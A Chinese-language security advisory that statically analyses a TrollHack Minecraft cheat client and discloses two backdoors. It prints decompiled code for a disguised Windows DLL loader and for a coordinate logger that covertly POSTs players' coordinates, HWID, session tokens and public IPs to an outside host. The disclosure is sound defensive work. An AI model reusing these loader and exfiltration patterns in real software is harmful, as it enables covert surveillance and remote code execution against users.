# 安全公告:TrollHack 内置坐标记录器(后门)

**严重程度:高(隐私 / 数据外泄)**
**状态:本仓库已移除**
**类型:未声明的遥测 / 坐标记录器(coord logger)**

原版 TrollHack("Oa7h EXTREME" / ZKM 混淆)客户端存在两处恶意行为:
1. **原生 DLL 加载器**(严重 / 潜在 RCE)—— 打包了一个伪装成 `.dat` 的 Windows DLL 并在启动时 `System.load` 执行;
2. **坐标记录器**(高 / 隐私外泄)—— 持续把玩家实时坐标、服务器、HWID、会话 token 上报到作者后端。

本文给出完整静态分析证据。所有结论均可在 `obf-test-NAMED.jar` 字节码中复核。**本仓库已将两者全部移除**(相关文件删除、加载代码删除),编译产物不含任何原生库、不发任何网络请求。

---

## 发现一:伪装成 `.dat` 的原生 DLL 加载器(最严重)

原版在 jar 资源里**藏了一个 16 MB 的 Windows 原生 DLL**,扩展名伪装成 `.dat`:

```
src/main/resources/neko/lib/9e1c3a7f-5d2b-48f1-b7c4-troll-extreme.dat
```

`file` 一看便知它根本不是数据:

```
PE32+ executable (DLL) (GUI) x86-64, for MS Windows     # 头部魔数 4D 5A = "MZ"
```

`shit.Loader` 的静态初始化块会把它释放到临时目录、**改名成 `Strinova_*.dll`(冒充另一款游戏的文件)**,然后加载执行:

```java
static {
    System.out.println("... Obf by Oa7h [EXTREME] ...");
    Loader.nekoLoaderPayload();                                  // 填充 JNI 载荷(ByteBuffer z)
    String nativeLibrary = "neko/lib/9e1c3a7f-...-troll-extreme.dat";
    File file = File.createTempFile("Strinova_", ".dll");        // ← 伪装文件名
    file.deleteOnExit();
    try (InputStream in = Loader.class.getResourceAsStream("/" + nativeLibrary)) {
        Files.copy(in, file.toPath(), REPLACE_EXISTING);
    }
    System.load(file.getAbsolutePath());                         // ← 加载并执行原生代码
}
// 另有 native 方法:
public static native void registerNativesForClass(int, Class<?>);
```

**为什么这是最严重的:** 原生 DLL 运行在 JVM **沙箱之外**,可以做任何事 —— 读写任意文件、联网、注入其他进程、持久化、读取凭据。一个作弊端在你不知情时释放并执行一个来路不明、还刻意伪装文件名的原生 DLL,这已经不是"作弊功能",而是**恶意程序 / RAT 级别的能力**。DLL 本体未做动态分析,但"隐藏 + 伪装 + 自动加载"这三点本身就足以判定为后门。

配套的还有两个 DRM/会话 blob(`assets/trollhack-recode/loader-session.dat`、`user.dat`)+ `HttpUtil` 里一串校验文案(`"This runtime must be started by the TrollHack Loader."` / `"Loader launch proof does not match this runtime."`)——说明整个客户端被设计成**必须由一个私有的外部 "TrollHack Loader" 启动**,而那个 Loader 正是注入这枚原生 DLL 的载体。

### 本仓库处置(发现一)
- **删除** 原生 DLL `neko/lib/…-troll-extreme.dat` 及整个 `neko/` 目录 —— 不分发任何原生二进制
- **删除** `shit/Loader.java`(那段 `System.load` 加载器 + JNI 载荷),该类在重建后本就无人引用(死代码)
- **删除** DRM blob `loader-session.dat` / `user.dat`
- 删除后 `./gradlew build` 依旧 **BUILD SUCCESSFUL**,证明无任何功能依赖它们

> 注:该 DLL 仅 Windows 可加载,且 `Loader` 类在反编译重建后已无人 class-load,所以它在本项目运行时从未被执行 —— 但它仍**躺在原始 jar 里**,任何拿到原版的人都会中招。这就是它必须被揪出来的原因。

---

## 发现二:坐标记录器(coord logger)

| 项目 | 内容 |
|---|---|
| 收集的数据 | 会话 token、HWID、服务器 IP、维度、**X/Y/Z 坐标**、公网 IP、时间戳 |
| 上报端点 | `POST http://neko.antichest.pw/api/index.php`(路由 `/coordinate-log`) |
| 触发条件 | 玩家每移动 ≥ 8 格,或切换服务器 / 维度 |
| 承载方式 | 后台守护线程,名为 `TrollHack-CoordinateTelemetry` |
| 用户可见 | 无。无提示、无开关、无设置项 |
| 本仓库处置 | 发送逻辑与其触发器已打桩;整套联网授权已中和。**编译产物不发出任何请求** |

---

## 证据链

### 1. 触发器:每次移动都检查是否该上报

`shit.manager.SessionManager` 订阅了 tick 事件。`m490` 决定是否上报:

```java
double d  = player.getX() - this.value140;
double d2 = player.getY() - this.value173;
double d3 = player.getZ() - this.value132;
return d*d + d2*d2 + d3*d3 >= 64.0;   // 移动超过 8 格(8² = 64)即上报
```

同时,只要**服务器地址**(`m245`,返回当前服 IP)或**维度**(`m1024`)变化,也会触发。也就是说:你换服、进地狱、或者只是走了几步,它就记一次。

### 2. 载荷:打包你的坐标和身份

`SessionManager.lambda$send$0` 构造如下 JSON(字段名摘自 `makeConcatWithConstants` 常量,原样):

```json
{
  "token": "…", "hwid": "…",
  "server": "<服务器IP>", "dimension": "minecraft:overworld",
  "dimensionLabel": "主世界/地狱/末地",
  "x": <X>, "y": <Y>, "z": <Z>,
  "client": "trollhack-recode", "version": "1.0.0",
  "time": "…", "timestamp": <epoch>
}
```

其中维度还被 `m620` 翻译成中文标签(`地狱` / `末地` / `主世界`)—— 说明这份数据是给**人看的报表 / 面板**准备的,不是什么匿名统计。

### 3. 传输:后台线程 POST 到 antichest.pw

```java
// SessionManager.send(...) 反编译(变量名保留原始 ZKM 命名)
Thread thread = new Thread(
    () -> lambda$send$0(server, token, hwid, dim, x, y, z),
    "TrollHack-CoordinateTelemetry"      // ← 线程名由作者亲自命名
);
thread.setDaemon(true);
thread.start();
```

`lambda$send$0` 末尾:

```java
ApiEndpoints2.m651("/coordinate-log", jsonBody);   // POST
```

端点主机在 `shit.util.ApiEndpoints2` 第 33 行**明文**写着:

```
http://neko.antichest.pw/api/index.php
```

此外 `ApiEndpoints3`(第 558 行)会先通过 `api.ipify.org` / `ifconfig.me` / `icanhazip.com` 获取用户**公网 IP**。

### 4. 归属

模块 `IRC` 的描述是 `"Connects to the NekoTeam IRC relay chat."` —— `NekoTeam` 对应 `neko.antichest.pw`,即上报后端所属组织。域名 `antichest.pw`(反-藏宝箱)本身就点明了用途。

---

## 影响

拥有该后端的人可以:

- **实时定位每一个用户**在每一个服务器上的坐标 → 挖矿、建家、藏基地全部暴露(经典的"用作弊端反被作者猎杀 / 卖坐标")
- 用 **HWID + token + 公网 IP** 对用户跨服打指纹、关联身份、封禁或勒索
- 在用户完全不知情的情况下长期收集上述数据

对一个作弊客户端而言,这是**最典型的恶意行为之一**:它把使用者本身变成了被监控的对象。

---

## 本仓库的处置

- `SessionManager.send(...)` 及其 tick 触发器 `setEvent2Inner23(...)` → 打桩(抛异常),**遥测永不触发**
- 联网授权总开关 `ApiEndpoints3.isSet46()` / `isSet68()` → `return true`,使 `ApiEndpoints2/3`、`HttpUtil`、web-login 全部成为够不着的死代码
- 结果:客户端启动到主菜单**零联网、零上报**,不会向 `neko.antichest.pw` 发送任何数据

## 如何自行复核

```bash
# 反编译看源码
javap -p -c obf-test-NAMED.jar   # 或用 Recaf 打开

# 关键位置:
#   shit/manager/SessionManager   -> m490(触发) / send(线程) / lambda$send$0(载荷)
#   shit/util/ApiEndpoints2:33     -> http://neko.antichest.pw/api/index.php
#   shit/util/ApiEndpoints3:558    -> 公网 IP 抓取
```

---

## 免责声明

本公告基于对一份**公开分发的二进制产物**的静态逆向分析,用于安全研究与用户知情。所有技术论断均附源码 / 字节码位置,可独立验证。若原作者认为分析有误,欢迎提 issue 附字节码反驳。
